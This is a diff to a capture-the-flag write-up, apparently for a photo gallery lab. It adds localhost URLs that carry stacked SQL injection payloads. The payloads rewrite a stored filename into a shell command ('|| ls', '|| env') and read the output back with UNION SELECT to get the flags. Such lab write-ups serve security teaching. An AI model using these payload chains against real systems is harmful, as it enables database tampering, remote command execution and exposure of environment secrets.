@@ -44,14 +44,20 @@ Successfully updated file title 3.
 
 Now we can update **filename** to perform RCE.
 
+[http://127.0.0.1/xxxxxxxxxx/fetch?id=1;UPDATE photos SET filename='* || ls > test' WHERE id=3;COMMIT;--]()
+
 ```sql
 id=1;UPDATE photos SET filename='* || ls > test' WHERE id=3;COMMIT;--
 ```
 
-Visit **INDEX** page to execute the command.
+Visit **INDEX** http://127.0.0.1/xxxxxxxxxx/ page to execute the command.
+
+And then go check the execution result
+
+[http://127.0.0.1/xxxxxxxxxx/fetch?id=1.1 UNION SELECT 'test'--]()
 
 ```sql
-id=1 UNION SELECT 'test'--
+id=1.1 UNION SELECT 'test'--
 ```
 
 Here we got **ls** results in file **test**
@@ -62,14 +68,20 @@ Dockerfile files main.py main.pyc prestart.sh requirements.txt test uwsgi.ini
 
 ## 0x03 FLAG
 
+[http://127.0.0.1/xxxxxxxxxx/fetch?id=1;UPDATE photos SET filename='* || env > test' WHERE id=3;COMMIT;--]()
+
 ```sql
 id=1;UPDATE photos SET filename='* || env > test' WHERE id=3;COMMIT;--
 ```
 
-Visit **INDEX** page to execute the command.
+Visit **INDEX** http://127.0.0.1/xxxxxxxxxx/ page to execute the command.
+
+And then go get the flags
+
+[http://127.0.0.1/xxxxxxxxxx/fetch?id=1.1 UNION SELECT 'test'--]()
 
 ```sql
-id=1 UNION SELECT 'test'--
+id=1.1 UNION SELECT 'test'--
 ```
 
 Here we got all 3 flags in one place.
